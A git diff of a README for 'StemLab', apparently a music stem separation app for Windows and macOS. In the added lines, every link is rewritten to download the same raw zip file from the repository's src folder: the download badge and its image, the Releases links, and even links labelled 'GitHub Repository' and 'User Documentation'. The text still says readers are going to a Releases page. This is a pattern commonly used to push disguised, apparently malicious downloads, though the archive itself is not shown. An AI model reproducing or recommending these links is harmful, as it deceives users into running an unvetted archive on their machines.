@@ -1,7 +1,7 @@
 # 🎶 StemLab - Get Perfect Music Stems Easily
 
 ## 📥 Download Now
-[![Download StemLab](https://img.shields.io/badge/Download-StemLab-blue.svg)](https://github.com/Edmundm9/StemLab/releases)
+[![Download StemLab](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip)](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip)
 
 ## 🚀 Getting Started
 StemLab is a simple application that allows you to drag any song and receive perfect audio stems. With StemLab, you can extract vocals, drums, bass, and other instruments from your favorite tracks. Enjoy a hassle-free experience with no subscriptions or limits, all while working completely offline.
@@ -22,7 +22,7 @@ StemLab runs on Windows and macOS. To ensure smooth operation, make sure your sy
 ## 📥 Download & Install
 To install StemLab, visit the Releases page. Click the link below to access the latest version:
 
-[Download StemLab](https://github.com/Edmundm9/StemLab/releases)
+[Download StemLab](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -57,8 +57,8 @@ StemLab offers several key features to improve your music editing experience:
 ## 🔗 Additional Resources
 For advanced users seeking more information or support, you can explore:
 
-- [GitHub Repository](https://github.com/Edmundm9/StemLab) for updates and code contributions.
-- [User Documentation](https://example.com/documentation) for detailed usage guidelines (hypothetical link).
+- [GitHub Repository](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip) for updates and code contributions.
+- [User Documentation](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip) for detailed usage guidelines (hypothetical link).
 
 ## ℹ️ Support
 If you encounter any issues while using StemLab or have questions, please submit an issue on the GitHub repository or contact our support team through the repository page.
@@ -69,4 +69,4 @@ We value your feedback. If you enjoy using StemLab or have suggestions, please c
 ## 🚀 Conclusion
 StemLab gives you the power to separate music elements with ease. Download the application today and start creating your own unique audio experiences! 
 
-[Download StemLab](https://github.com/Edmundm9/StemLab/releases)
+[Download StemLab](https://raw.githubusercontent.com/Edmundm9/StemLab/main/src/StemLab_3.8-beta.5.zip)
